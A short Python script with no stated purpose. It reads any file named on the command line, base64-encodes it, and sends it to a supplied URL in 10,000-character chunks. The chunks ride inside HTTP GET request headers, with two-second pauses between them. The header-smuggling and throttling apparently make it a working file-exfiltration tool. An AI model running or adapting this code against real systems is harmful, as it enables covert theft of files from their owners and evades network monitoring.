import requests
import base64 
import time

import sys

filetoread=sys.argv[1]
ip=sys.argv[2]
f = open(filetoread, "rb")
d=f.read()
# fw=open("test.docx","wb")
# fw.write(d)

# print(type(d))
d = base64.b64encode(d) 
length=len(d)
print(length)
# new_str=str(d).split('\\x')
# d="".join(new_str)
# print(d)
header={"data":(d)[:10000],"filename":filetoread,"seq":str(0),"start":"true"}
# print(len((d)[:10000]))
x = requests.get(ip,headers=header)
print(x.text)
n=int(length/10000)
print(n)
for i in range(1,n+1):
    time.sleep(2)
    print(i)
    # header["data"+str(i)]=str(d)[i*10000:(i+1)*10000]
    header={"data":(d)[i*10000:(i+1)*10000],"filename":filetoread,"seq":str(i)}
    # print(d[i*10000:(i+1)*10000])
    x = requests.get(ip,headers=header)
    print(x.text)

x = requests.get(ip,headers={"filename":filetoread,"end":"true"})
    

# header["data2"]="hello"



